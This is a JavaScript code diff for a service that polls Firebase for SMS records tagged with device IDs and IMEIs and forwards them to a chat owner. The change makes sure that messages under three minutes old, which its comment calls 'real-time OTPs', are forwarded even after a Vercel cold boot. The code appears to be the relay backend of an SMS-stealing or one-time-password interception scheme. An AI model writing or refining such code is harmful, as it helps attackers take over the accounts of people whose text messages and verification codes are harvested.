@@ -147,6 +147,28 @@ function findSmsNodes(snapshot, path = "") {
   return found;
 }
 
+function getRawTimestamp(obj) {
+  let ts = obj.time || obj.timestamp || obj.date || obj.created_at || null;
+  if (!ts) return 0;
+  
+  if (typeof ts === "number") {
+    return ts < 1e12 ? ts * 1000 : ts;
+  }
+  
+  if (typeof ts === "string") {
+    // If it's a numeric string (e.g. "1773047505835")
+    if (/^\d+$/.test(ts.trim())) {
+      const num = parseInt(ts.trim(), 10);
+      return num < 1e12 ? num * 1000 : num;
+    }
+    // Attempt standard Date.parse for strings like "09 Mar 2026, 07:49:02 pm"
+    const parsed = Date.parse(ts);
+    if (!isNaN(parsed)) return parsed;
+  }
+  
+  return 0; // fallback meaning "very old"
+}
+
 function extractFields(obj) {
   const device =
     obj.device || obj.deviceId || obj.device_id || obj.imei || obj.id || "Unknown";
@@ -263,11 +285,21 @@ async function pollFirebaseIteration(chatId, baseUrl) {
     if (seen.has(h)) continue;
     seen.add(h);
     
-    // Only notify if this is NOT the first run of the server instance
-    // (Otherwise we'd spam the user with 1000s of old messages on Vercel cold boot)
+    // Only notify if this is NOT the first run of the server instance,
+    // OR if it IS but the message arrived in the last 3 minutes!
+    // (This guarantees real-time OTPs are sent even when Vercel is cold-booting,
+    //  while still blocking the thousands of old messages from yesterday).
     if (!isFirstRun) {
       const fields = extractFields(obj);
       await notifyUserOwner(chatId, fields);
+    } else {
+      const rawTs = getRawTimestamp(obj);
+      const ageMs = Date.now() - rawTs;
+      // If message is newer than 3 minutes, notify even on cold boot!
+      if (rawTs > 0 && ageMs < 3 * 60 * 1000) {
+        const fields = extractFields(obj);
+        await notifyUserOwner(chatId, fields);
+      }
     }
   }
 }
